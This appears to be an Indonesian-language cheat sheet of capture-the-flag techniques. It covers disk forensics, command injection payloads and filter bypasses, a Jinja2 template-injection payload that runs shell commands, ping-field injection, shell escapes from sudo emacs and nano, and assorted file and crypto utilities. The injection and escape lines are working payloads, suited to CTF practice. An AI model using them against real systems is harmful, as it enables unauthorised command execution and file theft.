# Cara mount detail
fls -r -o 360448 disk.flag.img | grep -Ei "flag|txt|secret|hidden"
icat -o 360448 disk.flag.img 1234

# Echo
|Syntax|Fungsi|
|------|------|
|test; echo pwned OR test; ls|Membuktikan "command injection"|
|echo `ls` OR echo $(ls)|untuk ls|
|echo `cat flag.txt` OR echo $(cat flag.txt) OR echo $(<flag.txt)| untuk open flag.txt|

# ls Kena blokir
1. echo *
2. echo * .*
# cat Kena blokir
1. more flag.txt
2. less flag.txt
3. sed '' flag.txt

# SSTI
## Via jinja2 
{{7*7}} (cek ombak)
{{ cycler.__init__.__globals__.os.popen('ls').read() }} (ls))

# Ping exploitation

| notasi | syntax |
|--------|--------|
| ; | 1.1.1.1; ls |
|&| 1.1.1.1 & ls|
|&&| 1.1.1.1 && ls|
|``| (masih gacha) 8.8.8.8`ls` |
|$|(masih gacha) 8.8.8.8$(id) OR ping $(whoami)|
| (double pipe) | 1.1.1.1 (double pipe) ls |
| (single pipe) | 1.1.1.1 (single pipe) ls |

# Mempersatukan pecahan-zip
cat part_1 part_2 > archive.zip

# Read file via emacs
sudo /PATH/emacs
alt + x - type "shell"

# Unlock file.enc using RSA.key
wc -c file.enc (256=RSA-2048 & 512=RSA-4096)
openssl pkeyutl -decrypt -inkey key.key -in flag.enc (for 256)

# Copy isi file.txt
cat file.txt | xclip -selection clipboard

# Tools nembuka foto
1. feh file.png
2. shotwell file.png
3. open file.png

# Copy teks di dalam gambar (kadang typo, mending pake G-LENS)
tesseract file.png output

# Checksum256
sha256sum files/* | grep "3ad3"

# Cara mengetahui commit yang udah dihapus (github)
git log --all --oneline(ini opsional)
git show 092h98duh872qiasgd98ih9

# Biner calculator
1. https://seomagnifier.com/binary-calculator (legkap)
2. https://www.rapidtables.com/calc/math/binary-calculator.html

# Konek SQL
sqlite3 user.db (masuk ke user.db)
.tables
SELECT * FROM blabal;

# Run command via nano
^R^X - cat flat.txt

# CURL
1. curl http://target.com = inspect target.com
2. curl -I http://target.com = lihar response header target.com
